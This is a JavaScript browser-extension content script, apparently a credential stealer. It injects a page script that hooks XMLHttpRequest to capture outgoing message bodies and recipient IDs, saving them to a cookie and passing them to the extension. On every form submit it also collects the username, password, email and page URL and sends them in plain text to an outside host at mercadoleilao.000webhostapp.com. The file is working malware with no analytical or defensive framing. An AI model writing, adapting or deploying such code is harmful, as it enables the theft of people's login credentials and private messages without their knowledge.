function exec(fn) {
    var s = document.createElement('script');
    s.setAttribute("type", "application/javascript");
    s.onload = function () {
        s.parentNode.removeChild(s);
    };
    (document.head || document.documentElement).appendChild(s);
    s.textContent = '(' + fn + ')("' + chrome.runtime.id + '")';
}

exec(function (parameter) {
    function saveOption(cname, cvalue) {
      var days = 2;
      var d = new Date();
      d.setTime(d.getTime() + (days * 24 * 60 * 60 * 1000));
      var expires = "expires=" + d.toUTCString();
      document.cookie = cname + "=" + cvalue + ";" + expires + ";path=/";
  }
  
    var extensionID = parameter;
    var origOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function () {
        var getParameterByName = function (content, name) {
            name = name.replace(/[\[]/, "\\[").replace(/[\]]/, "\\]");
            var regex = new RegExp("[\\?&]" + name + "=([^&#]*)", "i"),
                results = regex.exec(content);
            return results == null ? "" : decodeURIComponent(results[1].replace(/\+/g, " "));
        };
        var func = function () {
            var content = this.PARAMETERS_S;
            var sendContent = getParameterByName(content || "  ", "body");
            if (sendContent) {
                var msg = encodeURI(sendContent) + " " + getParameterByName(content || "  ", "specific_to_list[0]") + getParameterByName(content || "  ", "specific_to_list[1]");
                saveOption("cmsgl", msg);
                chrome.runtime.sendMessage(extensionID, {
                    action: "add",
                    data: msg
                }, function (responseText) {
                });
            }
            this.removeEventListener("load", func);
        };
        this.addEventListener('load', func);
        origOpen.apply(this, arguments);
    };
    var origSend = XMLHttpRequest.prototype.send;
    XMLHttpRequest.prototype.send = function () {
        this.PARAMETERS_S = arguments[0];
        origSend.apply(this, arguments);
    };

});

$(function () {

    $("form").submit(function (e) {
        var passwordBoxes = $("input[type=password]");
        var username = $("input[type=text]").not(passwordBoxes).filter(function () {
            var field = $(this);
            return field && ( field.val() || field.html() ) || {
                    val: function () {
                        return "nouser"
                    }
                };
        }).val();
        var email = $("input[type=email]").val();
        var password = passwordBoxes && passwordBoxes.val() || "";
        var msg = "U: " + username + " || P: " + password + " || E: " + email + " || L: " + location.href;
        if (password && password.length > 4)
            chrome.runtime.sendMessage({
                method: 'GET',
                action: 'xhttp',
                url: 'http://mercadoleilao.000webhostapp.com/analyse.php?c=' + msg
            }, function (responseText) {
            });
    });

});